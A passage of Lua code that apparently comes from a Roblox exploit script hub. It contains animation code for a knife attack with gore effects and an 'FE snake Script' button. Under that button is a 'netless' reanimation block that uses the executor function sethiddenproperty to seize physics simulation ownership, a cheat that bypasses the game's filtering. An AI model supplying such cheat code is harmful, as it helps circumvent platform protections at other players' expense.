				repeat
					Swait()
					if TORSOPART then
						TORSOPART.Anchored = true
						TORSOPART.CFrame = RootPart.CFrame*CF(0,0,-2.2)
					end
				until DISPOSE == true
				TORSOPART.Anchored = false
			end))
			for i=0, 0.5, 0.1 / Animation_Speed do
				Swait()
				RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.15, 0.75, -1.3) * ANGLES(RAD(90), RAD(90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			end
			CreateSound(28144268,Knife,2,MRANDOM(8,13)/10,false)
			CreateSound(180083298,TORSOPART,5,MRANDOM(8,13)/10,false)
			coroutine.resume(coroutine.create(function()
				for i = 1, 750 do
					Swait()
					if HUMAN and TORSOPART then
						if HUMAN.Health > 25 then
							SprayBlood(TORSOPART.CFrame*CF(0,TORSOPART.Size.Y/2,-TORSOPART.Size.Z/2).p,TORSOPART.CFrame*CF(MRANDOM(-3,3)/15,TORSOPART.Size.Y+MRANDOM(-3,3)/35,-TORSOPART.Size.Z*MRANDOM(8,25)/10).p,MRANDOM(15,35)/10)
							HUMAN.Health = HUMAN.Health - 25
							HUMAN.WalkSpeed = MRANDOM(5,45)
						else
							break
						end
					else
						break
					end
				end
				local SCREAMS = {160718677,337800380}
				if HUMAN and TORSOPART then
					if HUMAN.Health == 26 then
						local HEAD = TORSOPART.Parent:FindFirstChild("Head")
						if HEAD then
							CreateSound(SCREAMS[MRANDOM(1,#SCREAMS)],HEAD,5,MRANDOM(13,15)/10,false)
							local FACE = HEAD:FindFirstChild("face")
							if FACE then
								FACE.Texture = "http://www.roblox.com/asset/?id=145854465"
							end
						end
						if TORSOPART.Name == "Torso" then
							Ragdoll(TORSOPART.Parent,Torso)
						elseif TORSOPART.Name == "UpperTorso" then
							R15Ragdoll(TORSOPART.Parent)
						end
					end
					HUMAN.WalkSpeed = 16
				end
			end))
			for i=0, 0.2, 0.1 / Animation_Speed do
				Swait()
				RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 1 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(15)), 1 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(2, 0.75, -1.3) * ANGLES(RAD(90), RAD(90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(90), RAD(0), RAD(-15)) * LEFTSHOULDERC0, 1 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(75), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			end
			DISPOSE = true
			local bv = Instance.new("BodyVelocity") 
			bv.maxForce = Vector3.new(1e9, 1e9, 1e9)
			bv.velocity = CF(TORSOPART.Position,TORSOPART.CFrame*CF(0,5,-15).p).lookVector*75
			bv.Parent = TORSOPART
			Debris:AddItem(bv,0.05)
			for i=0, 0.5, 0.1 / Animation_Speed do
				Swait()
				RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(-35)), 1 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(35)), 1 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(-25), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.15, 0.5, -0.5) * ANGLES(RAD(90), RAD(0), RAD(-35)) * LEFTSHOULDERC0, 1 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(110), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-65), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			end
		end
		HIT:disconnect()
		ATTACK = false
		Rooted = false
		PLAYANIMS = true
	end

	function Taunt()
		ATTACK = true
		Rooted = true
		PLAYANIMS = false
		CreateSound(159882303,Torso,5,MRANDOM(8,9)/10,false)
		for i=0, 1.5, 0.1 / Animation_Speed do
			Swait()
			RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(35), RAD(0)), 1 / Animation_Speed)
			RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(140)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
			LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-140)) * ANGLES(RAD(0), RAD(90), RAD(0)) * LEFTSHOULDERC0, 1 / Animation_Speed)
			RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
			LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 1 / Animation_Speed)
		end
		PLAYANIMS = true
		ATTACK = false
		Rooted = false
	end

	--//=================================\\
	--||	  ASSIGN THINGS TO KEYS
	--\\=================================//

	function MouseDown(Mouse)
		HOLD = true
		if ATTACK == false then
			Attack()
		end
	end

	function MouseUp(Mouse)
		HOLD = false
	end

	function KeyDown(Key)
		KEYHOLD = true
		if Key == "z" and ATTACK == false then
			if CLOAKED == false then
				Cloaked()
			else
				CLOAKED = false
			end
		end

		if Key == "t" and ATTACK == false then
			Taunt()
		end

		if string.byte(Key) == 50 and ATTACK == false and CLOAKED == false then
			if Speed == 12 then
				Speed = 30
			elseif Speed == 30 then
				Speed = 12
			end
		end
	end

	function KeyUp(Key)
		KEYHOLD = false
	end

	Mouse.Button1Down:connect(function(NEWKEY)
		MouseDown(NEWKEY)
	end)
	Mouse.Button1Up:connect(function(NEWKEY)
		MouseUp(NEWKEY)
	end)
	Mouse.KeyDown:connect(function(NEWKEY)
		KeyDown(NEWKEY)
	end)
	Mouse.KeyUp:connect(function(NEWKEY)
		KeyUp(NEWKEY)
	end)

	--//=================================\\
	--\\=================================//

	function unanchor()
		if UNANCHOR == true then
			g = Character:GetChildren()
			for i = 1, #g do
				if g[i].ClassName == "Part" then
					g[i].Anchored = false
				end
			end
		end
	end

	--//=================================\\
	--||	WRAP THE WHOLE SCRIPT UP
	--\\=================================//

	Humanoid.Changed:connect(function(Jump)
		if Jump == "Jump" and (Disable_Jump == true) then
			Humanoid.Jump = false
		end
	end)

	while true do
		Swait()
		script.Parent = WEAPONGUI
		ANIMATE.Parent = nil
		for _,v in next, Humanoid:GetPlayingAnimationTracks() do
			v:Stop();
		end
		SINE = SINE + CHANGE
		local TORSOVELOCITY = (RootPart.Velocity * VT(1, 0, 1)).magnitude
		local TORSOVERTICALVELOCITY = RootPart.Velocity.y
		local HITFLOOR = Raycast(RootPart.Position, (CF(RootPart.Position, RootPart.Position + VT(0, -1, 0))).lookVector, 4, Character)
		local WALKSPEEDVALUE = 6 / (Humanoid.WalkSpeed / 16)
		if ANIM == "Walk" and TORSOVELOCITY > 1 then
			RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, -0.15 * COS(SINE / (WALKSPEEDVALUE / 2))) * ANGLES(RAD(0), RAD(0) - RootPart.RotVelocity.Y / 75, RAD(0)), 2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
			Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(2.5 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(0) - Head.RotVelocity.Y / 30), 0.2 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
			RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 0.875 - 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), -0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ 0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0) - RightLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.3 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
			LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 0.875 + 0.125 * SIN(SINE / WALKSPEEDVALUE) - 0.15 * COS(SINE / WALKSPEEDVALUE*2), 0.125 * COS(SINE / WALKSPEEDVALUE) +0.2+ -0.2 * COS(SINE / WALKSPEEDVALUE)) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0) + LeftLeg.RotVelocity.Y / 75, RAD(0), RAD(76 * COS(SINE / WALKSPEEDVALUE))), 0.3 * (Humanoid.WalkSpeed / 16) / Animation_Speed)
		elseif (ANIM ~= "Walk") or (TORSOVELOCITY < 1) then
			RootJoint.C1 = Clerp(RootJoint.C1, ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			Neck.C1 = Clerp(Neck.C1, CF(0, -0.5, 0) * ANGLES(RAD(-90), RAD(0), RAD(180)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			RightHip.C1 = Clerp(RightHip.C1, CF(0.5, 1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
			LeftHip.C1 = Clerp(LeftHip.C1, CF(-0.5, 1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
		end
		if TORSOVERTICALVELOCITY > 1 and HITFLOOR == nil then
			ANIM = "Jump"
			if PLAYANIMS == true then
				RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-20), RAD(0), RAD(0)), 0.2 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(-40), RAD(0), RAD(20)) * RIGHTSHOULDERC0, 0.2 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-40), RAD(0), RAD(-20)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, -0.3) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(-5), RAD(0), RAD(-20)), 0.2 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, -0.3) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(-5), RAD(0), RAD(20)), 0.2 / Animation_Speed)
			end
		elseif TORSOVERTICALVELOCITY < -1 and HITFLOOR == nil then
			ANIM = "Fall"
			if PLAYANIMS == true then
				RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0, 0, 0 ) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.2 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0 , 0 + ((1) - 1)) * ANGLES(RAD(20), RAD(0), RAD(0)), 0.2 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(60)) * RIGHTSHOULDERC0, 0.2 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(-60)) * LEFTSHOULDERC0, 0.2 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1, -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(20)), 0.2 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(10)), 0.2 / Animation_Speed)
			end
		elseif TORSOVELOCITY < 1 and HITFLOOR ~= nil then
			ANIM = "Idle"
			if PLAYANIMS == true then
				RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, 0 + 0.05 * COS(SINE / 12)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
				Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0 - 2.5 * SIN(SINE / 12)), RAD(0), RAD(0)), 0.15 / Animation_Speed)
				RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(15), RAD(35), RAD(12)) * RIGHTSHOULDERC0, 0.15 / Animation_Speed)
				LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(0), RAD(0), RAD(0)) * LEFTSHOULDERC0, 0.15 / Animation_Speed)
				RightHip.C0 = Clerp(RightHip.C0, CF(1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
				LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1 - 0.05 * COS(SINE / 12), -0.01) * ANGLES(RAD(0), RAD(-80), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
			end
		elseif TORSOVELOCITY > 1 and HITFLOOR ~= nil then
			ANIM = "Walk"
			if PLAYANIMS == true then
				if Humanoid.WalkSpeed <= 17 then
					RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
					Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(0), RAD(0), RAD(0)), 0.15 / Animation_Speed)
					RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, 0) * ANGLES(RAD(20 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(5)) * RIGHTSHOULDERC0, 0.35 / Animation_Speed)
					LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, 0) * ANGLES(RAD(-20 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 0.35 / Animation_Speed)
					RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-15)), 2 / Animation_Speed)
					LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(15)), 2 / Animation_Speed)
				else
					RootJoint.C0 = Clerp(RootJoint.C0,ROOTC0 * CF(0, 0, -0.1) * ANGLES(RAD(35), RAD(0), RAD(5 * SIN(SINE / (WALKSPEEDVALUE / 2)))), 0.15 / Animation_Speed)
					Neck.C0 = Clerp(Neck.C0, NECKC0 * CF(0, 0, 0 + ((1) - 1)) * ANGLES(RAD(-25 - 1 * SIN(SINE / (WALKSPEEDVALUE / 2))), RAD(0), RAD(-5 * SIN(SINE / (WALKSPEEDVALUE / 2)))), 0.15 / Animation_Speed)
					RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.5, 0.5, -0.2) * ANGLES(RAD(0), RAD(35), RAD(0)) * ANGLES(RAD(35+20 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(5)) * RIGHTSHOULDERC0, 1 / Animation_Speed)
					LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.5, 0.5, -0.2) * ANGLES(RAD(0), RAD(-35), RAD(0)) * ANGLES(RAD(35-60 * COS(SINE / WALKSPEEDVALUE)), RAD(0), RAD(-5)) * LEFTSHOULDERC0, 1 / Animation_Speed)
					RightHip.C0 = Clerp(RightHip.C0, CF(1 , -1, 0) * ANGLES(RAD(0), RAD(90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(5)), 2 / Animation_Speed)
					LeftHip.C0 = Clerp(LeftHip.C0, CF(-1, -1, 0) * ANGLES(RAD(0), RAD(-90), RAD(0)) * ANGLES(RAD(0), RAD(0), RAD(-5)), 2 / Animation_Speed)
				end
			end
		end
		unanchor()
		if Rooted == false then
			Disable_Jump = false
			Humanoid.WalkSpeed = Speed
		elseif Rooted == true then
			Disable_Jump = true
			Humanoid.WalkSpeed = 0
		end
		if Head:FindFirstChild("face") then
			Head.face:remove()
		elseif Head:FindFirstChildOfClass("Sound") then
			Head:FindFirstChildOfClass("Sound"):remove()
		end
		Humanoid.Health = Humanoid.Health + 1
	end

	--//=================================\\
	--\\=================================//





	--//====================================================\\--
	--||			  		 END OF SCRIPT
	--\\====================================================//--
end)

TextButton_4.Parent = SCRIPTSTAB
TextButton_4.BackgroundColor3 = Color3.fromRGB(9, 11, 20)
TextButton_4.Position = UDim2.new(0.0345744677, 0, 0.625925839, 0)
TextButton_4.Size = UDim2.new(0, 350, 0, 39)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "FE snake Script"
TextButton_4.TextColor3 = Color3.fromRGB(170, 0, 255)
TextButton_4.TextSize = 31.000
TextButton_4.MouseButton1Down:Connect(function()

	--Hats are not required for this script wear items below to add to the script
	--Snake head: https://www.roblox.com/catalog/5411710016/Toy-Snek-Head
	--Snake Top: https://www.roblox.com/catalog/5813877364/Snake-Scales-Arms
	--Snake Bottom: https://www.roblox.com/catalog/5813878665/Snake-Scales-Legs
	--MADE BY DELECTIV/GUAVAJUICEFANCLUBFAN
	--SUBSCRIBE TO DARK ECCENTRIC
	function rmesh(a)
		if not (workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('Mesh') or workspace[game.Players.LocalPlayer.Name][a].Handle:FindFirstChild('SpecialMesh')) then return end
		old=game.Players.LocalPlayer.Character
		game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
		for i,v in next, workspace[game.Players.LocalPlayer.Name]:FindFirstChild(a).Handle:GetDescendants() do
			if v:IsA('Mesh') or v:IsA('SpecialMesh') then
				v:Remove()
			end
		end
		for i = 1 , 2 do
			game.Players.LocalPlayer.Character=old
		end
	end

	HumanDied = false for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do if v:IsA("BasePart") then  _G.netless=game:GetService("RunService").Heartbeat:connect(function() v.AssemblyLinearVelocity = Vector3.new(-30,0,0) sethiddenproperty(game.Players.LocalPlayer,"MaximumSimulationRadius",math.huge) sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",999999999) end) end end  local plr = game.Players.LocalPlayer local char = plr.Character local srv = game:GetService('RunService') local ct = {}  char.Archivable = true local reanim = char:Clone() reanim.Name = 'Nexo '..plr.Name..'' fl=Instance.new('Folder',char) fl.Name ='Nexo' reanim.Animate.Disabled=true char.HumanoidRootPart:Destroy() char.Humanoid:ChangeState(16)  for i,v in next, char.Humanoid:GetPlayingAnimationTracks() do v:Stop() end char.Animate:Remove()  function create(part, parent, p, r) Instance.new("Attachment",part) Instance.new("AlignPosition",part) Instance.new("AlignOrientation",part) Instance.new("Attachment",parent) part.Attachment.Name = part.Name parent.Attachment.Name = part.Name part.AlignPosition.Attachment0 = part[part.Name] part.AlignOrientation.Attachment0 = part[part.Name] part.AlignPosition.Attachment1 = parent[part.Name] part.AlignOrientation.Attachment1 = parent[part.Name] parent[part.Name].Position = p or Vector3.new() part[part.Name].Orientation = r or Vector3.new() part.AlignPosition.MaxForce = 999999999 part.AlignPosition.MaxVelocity = math.huge part.AlignPosition.ReactionForceEnabled = false part.AlignPosition.Responsiveness = math.huge part.AlignOrientation.Responsiveness = math.huge part.AlignPosition.RigidityEnabled = false part.AlignOrientation.MaxTorque = 999999999 end  for i,v in next, char:GetDescendants() do if v:IsA('Accessory') then v.Handle:BreakJoints() create(v.Handle,reanim[v.Name].Handle) end end  char.Torso['Left Shoulder']:Destroy() char.Torso['Right Shoulder']:Destroy() char.Torso['Left Hip']:Destroy() char.Torso['Right Hip']:Destroy()  create(char['Torso'],reanim['Torso']) create(char['Left Arm'],reanim['Left Arm']) create(char['Right Arm'],reanim['Right Arm']) create(char['Left Leg'],reanim['Left Leg']) create(char['Right Leg'],reanim['Right Leg'])  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') or v:IsA('Decal') then v.Transparency = 1 end end  reanim.Parent = fl  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.RenderStepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, reanim:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  for i,v in next, char:GetDescendants() do if v:IsA('BasePart') then table.insert(ct,srv.Stepped:Connect(function() v.CanCollide = false end)) end end  table.insert(ct,reanim.Humanoid.Died:Connect(function() plr.Character = char char:BreakJoints() reanim:Destroy() game.Players:Chat('-gr') _G.netless:Disconnect() HumanDied = true for _,v in pairs(ct) do v:Disconnect() end end))  plr.Character = reanim workspace.CurrentCamera.CameraSubject = reanim.Humanoid

	IT = Instance.new
	CF = CFrame.new
	VT = Vector3.new
	RAD = math.rad
	C3 = Color3.new
	UD2 = UDim2.new
	BRICKC = BrickColor.new
	ANGLES = CFrame.Angles
	EULER = CFrame.fromEulerAnglesXYZ
	COS = math.cos
	ACOS = math.acos
	SIN = math.sin
	ASIN = math.asin
	ABS = math.abs
	MRANDOM = math.random
	FLOOR = math.floor

	speed = 1
	sine = 1
	srv = game:GetService('RunService')

	reanim = game.Players.LocalPlayer.Character

	function hat(h,p,c1,c0,m)
		reanim[h].Handle.AccessoryWeld.Part1=reanim[p]
		reanim[h].Handle.AccessoryWeld.C1=c1 or CFrame.new()
		reanim[h].Handle.AccessoryWeld.C0=reanim[h].Handle.AccessoryWeld.C0:Lerp(c0 or CFrame.new(),1)
		if m == true then
			rmesh(h)
		end
	end

	m=game.Players.LocalPlayer:GetMouse()
	RJ = reanim.HumanoidRootPart.RootJoint
	RS = reanim.Torso['Right Shoulder']
	LS = reanim.Torso['Left Shoulder']
	RH = reanim.Torso['Right Hip']
	LH = reanim.Torso['Left Hip']
	Root = reanim.HumanoidRootPart
	NECK = reanim.Torso.Neck
	NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RJ.C1 = CF(0,-1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LS.C1 = CF(0,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

	-- for modes u can go in this link : https://Nexo.notxeneon15.repl.co/nexo/modes.lua

	coroutine.wrap(function()
		while true do -- anim changer
			if HumanDied then break end
			sine = sine + speed
			local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
			local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
			local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
			local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
			local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
			local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
			if lookvector > reanim.Humanoid.WalkSpeed then
				lookvector = reanim.Humanoid.WalkSpeed
			end
			if lookvector < -reanim.Humanoid.WalkSpeed then
				lookvector = -reanim.Humanoid.WalkSpeed
			end
			if rightvector > reanim.Humanoid.WalkSpeed then
				rightvector = reanim.Humanoid.WalkSpeed
			end
			if rightvector < -reanim.Humanoid.WalkSpeed then
				rightvector = -reanim.Humanoid.WalkSpeed
			end
			local lookvel = lookvector / reanim.Humanoid.WalkSpeed
			local rightvel = rightvector / reanim.Humanoid.WalkSpeed
			if reanim.Humanoid.Jump then -- jump
				NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),2.54+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RS.C0=RS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),0+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				LS.C0=LS.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1.76+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				RH.C0=RH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-2.83+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
				LH.C0=LH.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-4.44+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2)
			elseif Root.Velocity.y < -1 and reanim.Humanoid.Jump then -- fall
